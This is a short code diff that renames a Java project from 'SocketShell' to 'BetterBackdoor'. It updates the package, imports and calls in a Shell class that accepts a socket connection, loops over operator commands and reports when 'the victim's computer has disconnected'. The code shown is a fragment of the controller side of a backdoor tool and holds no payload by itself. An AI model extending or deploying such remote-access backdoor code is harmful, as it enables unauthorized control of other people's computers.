@@ -1,6 +1,6 @@
-package com.github.thatcherdev.socketshell.shell;
+package com.github.thatcherdev.betterbackdoor.shell;
 
-import com.github.thatcherdev.socketshell.SocketShell;
+import com.github.thatcherdev.betterbackdoor.BetterBackdoor;
 import java.io.PrintWriter;
 import java.net.ServerSocket;
 import java.net.Socket;
@@ -29,14 +29,14 @@ public class Shell {
 			System.out.println("Connection has been established");
 			System.out.println("Enter 'help' for a list of available commands");
 			while (true) {
-				String command = SocketShell.getInput("");
+				String command = BetterBackdoor.getInput("");
 				HandleCommand.handle(command);
 			}
 		} catch (Exception e) {
 			if (e.getMessage().equals("String index out of range: -1"))
-				SocketShell.error("The victim's computer has disconnected");
+				BetterBackdoor.error("The victim's computer has disconnected");
 			else
-				SocketShell.error(e.getMessage());
+				BetterBackdoor.error(e.getMessage());
 		} finally {
 			try {
 				if (socket != null)
